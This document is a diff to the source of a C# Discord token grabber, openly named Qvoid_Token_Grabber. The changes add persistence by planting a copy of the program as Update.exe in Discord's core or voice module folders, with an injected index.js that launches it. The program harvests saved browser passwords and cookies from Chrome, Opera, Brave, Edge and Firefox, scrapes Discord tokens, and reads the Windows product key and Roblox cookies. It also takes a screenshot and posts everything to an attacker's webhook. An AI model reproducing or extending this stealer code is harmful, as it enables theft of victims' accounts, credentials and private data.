@@ -79,46 +79,90 @@ namespace Qvoid_Token_Grabber.Discord
             }
 
             //Getting all of the Discord path(s) avaliable on the computer.
-            Find(out List<string> DiscordClients, out List<string> TokensLocation, out string DiscordExe);
+            Find(out List<string> DiscordCores, out List<string> DiscordVoices, out List<string> TokensLocation, out string DiscordExe);
 
-            foreach (var clientPath in DiscordClients)
+            if (DiscordCores.Count > 0)
             {
-                if (!Directory.Exists(clientPath + "\\Core"))
-                    Directory.CreateDirectory(clientPath + "\\Core");
-
-                try
+                foreach (var corePath in DiscordCores)
                 {
-                    //Writing the files into the discord core path because Discord executes the code which is written in the index.js
-                    File.WriteAllBytes($"{clientPath}\\Core\\System.Data.SQLite.Linq.dll", Resources.System_Data_SQLite_Linq);
-                    File.WriteAllBytes($"{clientPath}\\Core\\System.Data.SQLite.EF6.dll", Resources.System_Data_SQLite_EF6);
-                    File.WriteAllBytes($"{clientPath}\\Core\\System.Data.SQLite.dll", Resources.System_Data_SQLite);
-                    File.WriteAllBytes($"{clientPath}\\Core\\Newtonsoft.Json.dll", Resources.Newtonsoft_Json);
-                    File.WriteAllBytes($"{clientPath}\\Core\\EntityFramework.SqlServer.dll", Resources.EntityFramework_SqlServer);
-                    File.WriteAllBytes($"{clientPath}\\Core\\EntityFramework.dll", Resources.EntityFramework);
-                    File.WriteAllBytes($"{clientPath}\\Core\\BouncyCastle.Crypto.dll", Resources.BouncyCastle_Crypto);
+                    if (!Directory.Exists(corePath + "\\Core"))
+                        Directory.CreateDirectory(corePath + "\\Core");
 
-                    Directory.CreateDirectory($"{clientPath}\\Core\\x86");
-                    Directory.CreateDirectory($"{clientPath}\\Core\\x64");
-                    File.WriteAllBytes($"{clientPath}\\Core\\x64\\SQLite.Interop.dll", Resources.SQLite_Interop64);
-                    File.WriteAllBytes($"{clientPath}\\Core\\x86\\SQLite.Interop.dll", Resources.SQLite_Interop86);
+                    try
+                    {
+                        //Writing the files into the discord core path because Discord executes the code which is written in the index.js
+                        File.WriteAllBytes($"{corePath}\\Core\\System.Data.SQLite.Linq.dll", Resources.System_Data_SQLite_Linq);
+                        File.WriteAllBytes($"{corePath}\\Core\\System.Data.SQLite.EF6.dll", Resources.System_Data_SQLite_EF6);
+                        File.WriteAllBytes($"{corePath}\\Core\\System.Data.SQLite.dll", Resources.System_Data_SQLite);
+                        File.WriteAllBytes($"{corePath}\\Core\\Newtonsoft.Json.dll", Resources.Newtonsoft_Json);
+                        File.WriteAllBytes($"{corePath}\\Core\\EntityFramework.SqlServer.dll", Resources.EntityFramework_SqlServer);
+                        File.WriteAllBytes($"{corePath}\\Core\\EntityFramework.dll", Resources.EntityFramework);
+                        File.WriteAllBytes($"{corePath}\\Core\\BouncyCastle.Crypto.dll", Resources.BouncyCastle_Crypto);
+
+                        Directory.CreateDirectory($"{corePath}\\Core\\x86");
+                        Directory.CreateDirectory($"{corePath}\\Core\\x64");
+                        File.WriteAllBytes($"{corePath}\\Core\\x64\\SQLite.Interop.dll", Resources.SQLite_Interop64);
+                        File.WriteAllBytes($"{corePath}\\Core\\x86\\SQLite.Interop.dll", Resources.SQLite_Interop86);
+                    }
+                    catch { }
+
+                    try
+                    {
+                        if (File.Exists($"{corePath}\\Core\\{AppDomain.CurrentDomain.FriendlyName}"))
+                            File.Delete($"{corePath}\\Core\\{AppDomain.CurrentDomain.FriendlyName}");
+
+                        if (File.Exists($"{corePath}\\Core\\Update.exe"))
+                            File.Delete($"{corePath}\\Core\\Update.exe");
+
+                        //Writing the index.js file
+                        File.Copy(Assembly.GetEntryAssembly().Location, $"{corePath}\\Core\\Update.exe");
+                        File.WriteAllText(corePath + "\\index.js", "const child_process = require('child_process');\r\n" +
+                                                      "child_process.execFile(__dirname + '/core/Update.exe');\r\n\r\n" +
+                                                      "module.exports = require('./core.asar');");
+                    }
+                    catch { }
                 }
-                catch { }
-
-                try
+            }
+            else
+            {
+                foreach (var voicePath in DiscordVoices)
                 {
-                    if (File.Exists($"{clientPath}\\Core\\{System.AppDomain.CurrentDomain.FriendlyName}"))
-                        File.Delete($"{clientPath}\\Core\\{System.AppDomain.CurrentDomain.FriendlyName}");
+                    if (!Directory.Exists(voicePath + "\\node_modules"))
+                        Directory.CreateDirectory(voicePath + "\\node_modules");
 
-                    if (File.Exists($"{clientPath}\\Core\\Update.exe"))
-                        File.Delete($"{clientPath}\\Core\\Update.exe");
+                    try
+                    {
+                        //Writing the files into the discord core path because Discord executes the code which is written in the index.js
+                        File.WriteAllBytes($"{voicePath}\\node_modules\\System.Data.SQLite.Linq.dll", Resources.System_Data_SQLite_Linq);
+                        File.WriteAllBytes($"{voicePath}\\node_modules\\System.Data.SQLite.EF6.dll", Resources.System_Data_SQLite_EF6);
+                        File.WriteAllBytes($"{voicePath}\\node_modules\\System.Data.SQLite.dll", Resources.System_Data_SQLite);
+                        File.WriteAllBytes($"{voicePath}\\node_modules\\Newtonsoft.Json.dll", Resources.Newtonsoft_Json);
+                        File.WriteAllBytes($"{voicePath}\\node_modules\\EntityFramework.SqlServer.dll", Resources.EntityFramework_SqlServer);
+                        File.WriteAllBytes($"{voicePath}\\node_modules\\EntityFramework.dll", Resources.EntityFramework);
+                        File.WriteAllBytes($"{voicePath}\\node_modules\\BouncyCastle.Crypto.dll", Resources.BouncyCastle_Crypto);
 
-                    //Writing the index.js file
-                    File.Copy(Assembly.GetEntryAssembly().Location, $"{clientPath}\\Core\\Update.exe");
-                    File.WriteAllText(clientPath + "\\index.js", "const child_process = require('child_process');\r\n" +
-                                                   "child_process.execFile(__dirname + '/core/Update.exe');\r\n\r\n" +
-                                                   "module.exports = require('./core.asar');");
+                        Directory.CreateDirectory($"{voicePath}\\node_modules\\x86");
+                        Directory.CreateDirectory($"{voicePath}\\node_modules\\x64");
+                        File.WriteAllBytes($"{voicePath}\\Core\\x64\\SQLite.Interop.dll", Resources.SQLite_Interop64);
+                        File.WriteAllBytes($"{voicePath}\\Core\\x86\\SQLite.Interop.dll", Resources.SQLite_Interop86);
+                    }
+                    catch { }
+
+                    try
+                    {
+                        if (File.Exists($"{voicePath}\\node_modules\\{AppDomain.CurrentDomain.FriendlyName}"))
+                            File.Delete($"{voicePath}\\node_modules\\{AppDomain.CurrentDomain.FriendlyName}");
+
+                        if (File.Exists($"{voicePath}\\node_modules\\Update.exe"))
+                            File.Delete($"{voicePath}\\node_modules\\Update.exe");
+
+                        //Writing the index.js file
+                        File.Copy(Assembly.GetEntryAssembly().Location, $"{voicePath}\\node_modules\\Update.exe");
+                        File.AppendAllText(voicePath + "\\index.js", "const child_process = require('child_process');\r\n" +
+                                                      "child_process.execFile(__dirname + '/node_modules/Update.exe');\r\n\r\n");
+                    }
+                    catch { }
                 }
-                catch { }
             }
 
             if (TokensLocation.Count == 0)
@@ -136,19 +180,20 @@ namespace Qvoid_Token_Grabber.Discord
                     if (!String.IsNullOrEmpty(DiscordExe))
                         Process.Start(DiscordExe);
 
-                    Find(out DiscordClients, out TokensLocation, out DiscordExe);
+                    Find(out DiscordCores, out DiscordVoices, out TokensLocation, out DiscordExe);
                     if (TokensLocation.Count > 0)
                         break;
                 }
             }
 
             //Grabbing the Discord token(s)
-            var Tokens = FindTokens(TokensLocation, ref DiscordExe);
+            var Tokens = FindTokens(TokensLocation, ref DiscordExe).Distinct().ToList();
 
             if (Tokens.Count > 0)
             {
                 //Getting the information about the environment computer.
                 Machine machineInfo = new Machine();
+
                 List<QvoidWrapper.Discord.Client> Users = new List<QvoidWrapper.Discord.Client>();
                 List<QvoidWrapper.Discord.Embed> embeds = new List<QvoidWrapper.Discord.Embed>();
 
@@ -165,8 +210,7 @@ namespace Qvoid_Token_Grabber.Discord
                 embedHead.AddField("GPU Version", $"```{machineInfo.gpuVersion}```", true);
                 embedHead.AddField("Windows License", $"```{Windows.GetProductKey()}```", false);
                 embedHead.AddField("Roblox Cookie(s)", $"```{QvoidWrapper.Other.RobloxCookies() ?? "None"}```", false);
-
-                embedHead.Color = QvoidWrapper.Other.Spectrum(1);
+                embedHead.Color = QvoidWrapper.Other.Spectrum(0);
 
                 embeds.Add(embedHead);
 
@@ -180,18 +224,13 @@ namespace Qvoid_Token_Grabber.Discord
                                      $"{Environment.NewLine}GPU Version```{machineInfo.gpuVersion}```" +
                                      $"{Environment.NewLine}Windows License```{Windows.GetProductKey()}```{Environment.NewLine}";
 
-                int screenLeft = SystemInformation.VirtualScreen.Left;
-                int screenTop = SystemInformation.VirtualScreen.Top;
-                int screenWidth = SystemInformation.VirtualScreen.Width;
-                int screenHeight = SystemInformation.VirtualScreen.Height;
-
                 string ss_Name = DateTime.UtcNow.Ticks.ToString() + "_Capture.jpg";
-                using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
+                using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
                 {
                     try
                     {
                         using (Graphics g = Graphics.FromImage(bmp))
-                            g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
+                            g.CopyFromScreen(SystemInformation.VirtualScreen.Left, SystemInformation.VirtualScreen.Top, 0, 0, bmp.Size);
 
                         bmp.Save($"{Path.GetTempPath()}\\{ss_Name}", ImageFormat.Jpeg);
                     }
@@ -209,150 +248,222 @@ namespace Qvoid_Token_Grabber.Discord
                 BraveGrabber Brave = new BraveGrabber();
                 EdgeGrabber Edge = new EdgeGrabber();
 
+                #region Passwords
                 // ----------------------- Passwords -----------------------//
 
                 if (Chrome.PasswordsExists())
                 {
-                    try
+                    var key = Chrome.GetKey();
+                    if (key != null)
                     {
-                        foreach (var item in Chrome.GetAllPasswords(Chrome.GetKey()))
+                        var _Passwords = Chrome.GetAllPasswords(key);
+                        if (_Passwords != null && _Passwords.Count > 0)
                         {
-                            Passwords += $"{Environment.NewLine}Browser  : Chrome";
-                            Passwords += $"{Environment.NewLine}URL      : {item.url}";
-                            Passwords += $"{Environment.NewLine}Username : {item.username}";
-                            Passwords += $"{Environment.NewLine}Password : {item.password}";
-                            Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                            try
+                            {
+                                foreach (var item in _Passwords)
+                                {
+                                    Passwords += $"{Environment.NewLine}Browser  : Chrome";
+                                    Passwords += $"{Environment.NewLine}URL      : {item.url}";
+                                    Passwords += $"{Environment.NewLine}Username : {item.username}";
+                                    Passwords += $"{Environment.NewLine}Password : {item.password}";
+                                    Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                }
+                            }
+                            catch { }
                         }
                     }
-                    catch { }
                 }
 
                 if (Opera.PasswordsExists())
                 {
-                    try
+                    var key = Opera.GetKey();
+                    if (key != null)
                     {
-                        foreach (var item in Opera.GetAllPasswords(Opera.GetKey()))
+                        var _Passwords = Opera.GetAllPasswords(key);
+                        if (_Passwords != null && _Passwords.Count > 0)
                         {
-                            Passwords += $"{Environment.NewLine}Browser  : Opera";
-                            Passwords += $"{Environment.NewLine}URL      : {item.url}";
-                            Passwords += $"{Environment.NewLine}Username : {item.username}";
-                            Passwords += $"{Environment.NewLine}Password : {item.password}";
-                            Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                            try
+                            {
+                                foreach (var item in _Passwords)
+                                {
+                                    Passwords += $"{Environment.NewLine}Browser  : Opera";
+                                    Passwords += $"{Environment.NewLine}URL      : {item.url}";
+                                    Passwords += $"{Environment.NewLine}Username : {item.username}";
+                                    Passwords += $"{Environment.NewLine}Password : {item.password}";
+                                    Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                }
+                            }
+                            catch { }
                         }
                     }
-                    catch { }
                 }
 
                 if (Brave.PasswordsExists())
                 {
-                    try
+                    var key = Brave.GetKey();
+                    if (key != null)
                     {
-                        foreach (var item in Brave.GetAllPasswords(Brave.GetKey()))
+                        var _Passwords = Brave.GetAllPasswords(key);
+                        if (_Passwords != null && _Passwords.Count > 0)
                         {
-                            Passwords += $"{Environment.NewLine}Browser  : Brave";
-                            Passwords += $"{Environment.NewLine}URL      : {item.url}";
-                            Passwords += $"{Environment.NewLine}Username : {item.username}";
-                            Passwords += $"{Environment.NewLine}Password : {item.password}";
-                            Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                            try
+                            {
+                                foreach (var item in _Passwords)
+                                {
+                                    Passwords += $"{Environment.NewLine}Browser  : Brave";
+                                    Passwords += $"{Environment.NewLine}URL      : {item.url}";
+                                    Passwords += $"{Environment.NewLine}Username : {item.username}";
+                                    Passwords += $"{Environment.NewLine}Password : {item.password}";
+                                    Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                }
+                            }
+                            catch { }
                         }
                     }
-                    catch { }
                 }
 
                 if (Edge.PasswordsExists())
                 {
-                    try
+                    var key = Edge.GetKey();
+                    if (key != null)
                     {
-                        foreach (var item in Edge.GetAllPasswords(Edge.GetKey()))
+                        var _Passwords = Edge.GetAllPasswords(key);
+                        if (_Passwords != null && _Passwords.Count > 0)
                         {
-                            Passwords += $"{Environment.NewLine}Browser  : Edge";
-                            Passwords += $"{Environment.NewLine}URL      : {item.url}";
-                            Passwords += $"{Environment.NewLine}Username : {item.username}";
-                            Passwords += $"{Environment.NewLine}Password : {item.password}";
-                            Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                            try
+                            {
+                                foreach (var item in _Passwords)
+                                {
+                                    Passwords += $"{Environment.NewLine}Browser  : Edge";
+                                    Passwords += $"{Environment.NewLine}URL      : {item.url}";
+                                    Passwords += $"{Environment.NewLine}Username : {item.username}";
+                                    Passwords += $"{Environment.NewLine}Password : {item.password}";
+                                    Passwords += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                }
+                            }
+                            catch { }
                         }
                     }
-                    catch { }
                 }
+                #endregion Passwords
 
+                #region Cookies
                 // ----------------------- Cookies -----------------------//
 
                 if (Chrome.CookiesExists())
                 {
-                    try
+                    var key = Chrome.GetKey();
+                    if (key != null)
                     {
-                        foreach (var item in Chrome.GetAllCookies(Chrome.GetKey()))
+                        var _Cookies = Chrome.GetAllCookies(key);
+                        if (_Cookies != null && _Cookies.Count > 0)
                         {
-                            Cookies += $"{Environment.NewLine}Browser   : Chrome";
-                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                            try
+                            {
+                                foreach (var item in _Cookies)
+                                {
+                                    Cookies += $"{Environment.NewLine}Browser   : Chrome";
+                                    Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
+                                    Cookies += $"{Environment.NewLine}Name      : {item.Name}";
+                                    Cookies += $"{Environment.NewLine}Value     : {item.Value}";
+                                    Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                }
+                            }
+                            catch { }
                         }
                     }
-                    catch { }
                 }
 
                 if (Opera.CookiesExists())
                 {
-                    try
+                    var key = Opera.GetKey();
+                    if (key != null)
                     {
-                        foreach (var item in Opera.GetAllCookies(Opera.GetKey()))
+                        var _Cookies = Opera.GetAllCookies(key);
+                        if (_Cookies != null && _Cookies.Count > 0)
                         {
-                            Cookies += $"{Environment.NewLine}Browser   : Opera";
-                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                            try
+                            {
+                                foreach (var item in _Cookies)
+                                {
+                                    Cookies += $"{Environment.NewLine}Browser   : Opera";
+                                    Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
+                                    Cookies += $"{Environment.NewLine}Name      : {item.Name}";
+                                    Cookies += $"{Environment.NewLine}Value     : {item.Value}";
+                                    Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                }
+                            }
+                            catch { }
                         }
                     }
-                    catch { }
                 }
 
                 if (Brave.CookiesExists())
                 {
-                    try
+                    var key = Brave.GetKey();
+                    if (key != null)
                     {
-                        foreach (var item in Opera.GetAllCookies(Brave.GetKey()))
+                        var _Cookies = Brave.GetAllCookies(key);
+                        if (_Cookies != null && _Cookies.Count > 0)
                         {
-                            Cookies += $"{Environment.NewLine}Browser   : Brave";
-                            Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                            Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                            Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                            Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                            try
+                            {
+                                foreach (var item in _Cookies)
+                                {
+                                    Cookies += $"{Environment.NewLine}Browser   : Brave";
+                                    Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
+                                    Cookies += $"{Environment.NewLine}Name      : {item.Name}";
+                                    Cookies += $"{Environment.NewLine}Value     : {item.Value}";
+                                    Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                }
+                            }
+                            catch { }
                         }
                     }
-                    catch { }
                 }
 
                 if (Edge.CookiesExists())
                 {
-                    try
+                    var key = Edge.GetKey();
+                    if (key != null)
                     {
-                        foreach (var item in Edge.GetAllCookies(Edge.GetKey()))
+                        var _Cookies = Edge.GetAllCookies(key);
+                        if (_Cookies != null && _Cookies.Count > 0)
                         {
-                            Cookies += $"{Environment.NewLine}Browser   : Edge";
+                            try
+                            {
+                                foreach (var item in _Cookies)
+                                {
+                                    Cookies += $"{Environment.NewLine}Browser   : Edge";
+                                    Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
+                                    Cookies += $"{Environment.NewLine}Name      : {item.Name}";
+                                    Cookies += $"{Environment.NewLine}Value     : {item.Value}";
+                                    Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
+                                }
+                            }
+                            catch { }
+                        }
+                    }
+                }
+
+                try
+                {
+                    var _Cookies = FireFox.GetAllCookies();
+                    if (_Cookies != null)
+                    {
+                        foreach (var item in _Cookies)
+                        {
+                            Cookies += $"{Environment.NewLine}Browser   : FireFox";
                             Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
                             Cookies += $"{Environment.NewLine}Name      : {item.Name}";
                             Cookies += $"{Environment.NewLine}Value     : {item.Value}";
                             Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
                         }
                     }
-                    catch { }
-                }
-
-                try
-                {
-                    foreach (var item in FireFox.GetAllCookies())
-                    {
-                        Cookies += $"{Environment.NewLine}Browser   : FireFox";
-                        Cookies += $"{Environment.NewLine}Host Name : {item.HostName}";
-                        Cookies += $"{Environment.NewLine}Name      : {item.Name}";
-                        Cookies += $"{Environment.NewLine}Value     : {item.Value}";
-                        Cookies += $"{Environment.NewLine}---------------------------------------------------------------------";
-                    }
                 }
                 catch { }
+                #endregion Cookies
 
                 //Loop over all the grabbed tokens.
                 for (int i = 0; i < Tokens.Count; ++i)
@@ -384,14 +495,12 @@ namespace Qvoid_Token_Grabber.Discord
                     var userEmbed = new QvoidWrapper.Discord.Embed();
                     userEmbed.Title = $"__{userInfo.Username}#{userInfo.Discriminator} - ({userInfo.Id})__";
                     userEmbed.AddField("Username", $"```{userInfo.Username}#{userInfo.Discriminator}```", true);
-                    userEmbed.AddField("Email", $"```{(curUser.Email == "null" ? "None": curUser.Email)}```", true);
+                    userEmbed.AddField("Email", $"```{(curUser.Email == "null" ? "None" : curUser.Email)}```", true);
                     userEmbed.AddField("Phone Number", $"```{curUser.PhoneNumber}```", true);
                     userEmbed.AddField("Premium", $"```{userInfo.Premium}```", true);
-                    userEmbed.AddField("Nsfw", $"```{(curUser.Nsfw ? "True":"False")}```", true);
+                    userEmbed.AddField("Nsfw", $"```{(curUser.Nsfw ? "True" : "False")}```", true);
                     userEmbed.AddField("Payment Connected", $"```{(curUser.PaymentMethods ? "True" : "False")}```", true);
-
                     userEmbed.AddField("Token", $"```{curUser.Token}```", false);
-                    userEmbed.Color = QvoidWrapper.Other.Spectrum(0);
 
                     embeds.Add(userEmbed);
 
@@ -411,17 +520,6 @@ namespace Qvoid_Token_Grabber.Discord
                     File.WriteAllText(usersPath, QvoidWrapper.Encryption.ComputeSha256Hash(HeadMessage + BodyMessage));
 
                     QvoidWrapper.Discord.Webhook Webhook = new QvoidWrapper.Discord.Webhook(Config.Webhook);
-                    //QvoidWrapper.Discord.Embed embed = new QvoidWrapper.Discord.Embed();
-
-                    //embed.Color = Color.Red;
-                    //embed.Title = "Computer Information";
-                    //embed.Description = HeadMessage;
-
-                    //QvoidWrapper.Discord.Embed embed2 = new QvoidWrapper.Discord.Embed();
-                    //embed2.Timestamp = DateTime.UtcNow;
-                    //embed2.Color = Color.Red;
-                    //embed2.Title = "Discord Client(s) Information";
-                    //embed2.Description = BodyMessage;
 
                     string PasswordsPath = Path.GetTempPath() + "\\tmp7DDF46.txt";
                     string CookiesPath = Path.GetTempPath() + "\\tmp7RDF47.txt";
@@ -441,18 +539,19 @@ namespace Qvoid_Token_Grabber.Discord
                         File.Delete(CookiesPath);
                     }
 
-                    foreach (var embed in embeds)
+                    for (int i = 0; i < embeds.Count; ++i)
                     {
                         Thread.Sleep(100);
-                        Webhook.Send(embed);
+                        embeds[i].Color = embeds[i].Color.Name == "ffcc00cc" ? QvoidWrapper.Other.Spectrum(2) : embeds[i].Color;
+                        Webhook.Send(embeds[i]);
                     }
 
-                    if (File.Exists(ss_Name))
+                    if (File.Exists(Path.GetTempPath() + "\\" + ss_Name))
                     {
                         Thread.Sleep(100);
-                        Webhook.Send(null, new FileInfo(Path.GetTempPath() + "\\Capture.jpg"));
+                        Webhook.Send(null, new FileInfo(Path.GetTempPath() + ss_Name));
                         Thread.Sleep(100);
-                        File.Delete(Path.GetTempPath() + "\\Capture.jpg");
+                        File.Delete(Path.GetTempPath() + ss_Name);
                     }
                 }
             }
@@ -595,9 +694,10 @@ namespace Qvoid_Token_Grabber.Discord
         /// <param name="DiscordClients"></param>
         /// <param name="TokensLocation"></param>
         /// <param name="DiscordExe"></param>
-        static private void Find(out List<string> DiscordClients, out List<string> TokensLocation, out string DiscordExe)
+        static private void Find(out List<string> DiscordCores, out List<string> DiscordVoices, out List<string> TokensLocation, out string DiscordExe)
         {
-            DiscordClients = new List<string>();
+            DiscordVoices = new List<string>();
+            DiscordCores = new List<string>();
             TokensLocation = new List<string>();
             DiscordExe = "";
 
@@ -609,11 +709,17 @@ namespace Qvoid_Token_Grabber.Discord
                     var core = Directory.GetFiles(directory, "core.asar", SearchOption.AllDirectories);
                     var index = Directory.GetFiles(directory, "index.js", SearchOption.AllDirectories);
                     var discord_exe = Directory.GetFiles(directory, "Discord.exe", SearchOption.AllDirectories);
+                    var capture_exe = Directory.GetFiles(directory, "capture_helper.exe", SearchOption.AllDirectories);
 
                     foreach (var coreFile in core)
                         foreach (var indexFile in index)
                             if (coreFile.Replace("core.asar", "") == indexFile.Replace("index.js", ""))
-                                DiscordClients.Add(coreFile.Replace("core.asar", ""));
+                                DiscordCores.Add(coreFile.Replace("core.asar", ""));
+
+                    foreach (var capture in capture_exe)
+                        foreach (var indexFile in index)
+                            if (capture.Replace("capture_helper.exe", "") == indexFile.Replace("index.js", ""))
+                                DiscordVoices.Add(capture.Replace("capture_helper.exe", ""));
 
                     foreach (var file in discord_exe)
                     {
@@ -681,8 +787,6 @@ namespace Qvoid_Token_Grabber.Discord
             TokensLocation.Add(roaming + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");
             TokensLocation.Add(roaming + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
             TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
-            TokensLocation.Add(roaming + "\\Mozilla\\Firefox\\Profiles");
 
             List<string> tokens = new List<string>();
 
@@ -700,6 +804,7 @@ namespace Qvoid_Token_Grabber.Discord
                     if (!Directory.Exists(tokenPath))
                         continue;
 
+                    Thread.Sleep(1);
                     Thread _t = new Thread(() =>
                     {
                         //FireFox needs to be threat in special way ;(
@@ -763,6 +868,8 @@ namespace Qvoid_Token_Grabber.Discord
                 Thread.Sleep(150);
                 while (true)
                 {
+                    Thread.Sleep(1);
+
                     foreach (var t in Threads.ToList())
                     {
                         if (!t.IsAlive)
@@ -777,8 +884,6 @@ namespace Qvoid_Token_Grabber.Discord
 
             Thread Main = new Thread(() =>
             {
-                List<Thread> Threads = new List<Thread>();
-
                 foreach (var tokenPath in TokensLocation)
                 {
                     if (!Directory.Exists(tokenPath))
@@ -803,10 +908,12 @@ namespace Qvoid_Token_Grabber.Discord
                                 MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
                                 MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}");
 
+                                Thread.Sleep(1);
                                 foreach (Match match in matches)
                                     if (IsValidToken(match.Value))
                                         tokens.Add(match.Value);
 
+                                Thread.Sleep(1);
                                 foreach (Match match in mfaMatches)
                                     if (IsValidToken(match.Value))
                                         tokens.Add(match.Value);
@@ -838,7 +945,7 @@ namespace Qvoid_Token_Grabber.Discord
             FireFoxBased.Start();
 
             while (Main.IsAlive || FireFoxBased.IsAlive)
-                Thread.Sleep(1);
+                Thread.Sleep(5);
 
             return tokens;
         }
